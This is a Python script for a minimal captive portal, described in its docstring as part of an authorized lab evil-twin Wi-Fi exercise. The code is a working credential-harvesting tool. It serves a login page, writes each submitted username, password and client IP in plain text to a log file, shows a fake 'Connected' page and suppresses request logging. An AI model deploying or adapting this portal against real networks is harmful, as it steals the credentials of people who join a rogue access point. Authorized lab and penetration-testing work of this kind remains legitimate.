#!/usr/bin/env python3
"""Minimal captive portal used by ewave's authorized lab evil-twin exercise."""

import argparse
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

SUCCESS = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>Connected</title>
<style>body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
font:15px/1.5 system-ui,sans-serif;color:#f4f4f4;background:#0d0d0d}
main{width:min(420px,100%);padding:28px;border:1px solid #303030;border-radius:14px;background:#161616}
b{color:#5de6a8}h1{margin:0 0 8px;font-size:21px}p{margin:0;color:#a8a8a8}</style></head>
<body><main><b>ewave</b><h1>Connected</h1>
<p>This device is now signed in. You can close this window.</p></main></body></html>"""


def clean(value):
    return value.replace("\t", " ").replace("\r", " ").replace("\n", " ")[:256]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--root", required=True)
    parser.add_argument("--creds", required=True)
    args = parser.parse_args()
    try:
        with open(args.creds, "w", encoding="utf-8"):
            pass
    except OSError:
        pass
    with open(os.path.join(args.root, "portal.html"), "rb") as portal_file:
        portal = portal_file.read()
    success = SUCCESS.encode("utf-8")

    class Handler(BaseHTTPRequestHandler):
        def send_page(self, body):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self.send_page(portal)

        def do_POST(self):
            if urlparse(self.path).path != "/submit":
                self.send_error(404, "Not found")
                return
            try:
                length = int(self.headers.get("Content-Length", "0") or "0")
            except ValueError:
                length = 0
            body = self.rfile.read(min(max(length, 0), 65536)).decode("utf-8", "replace")
            form = parse_qs(body, keep_blank_values=True)
            username = clean((form.get("username") or [""])[0])
            password = clean((form.get("password") or [""])[0])
            client = clean(self.client_address[0])
            with open(args.creds, "a", encoding="utf-8") as log:
                log.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%dT%H:%M:%S"), client,
                                                username, password))
                log.flush()
            self.send_page(success)

        def log_message(self, fmt, *values):
            pass

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    server.serve_forever()


if __name__ == "__main__":
    main()
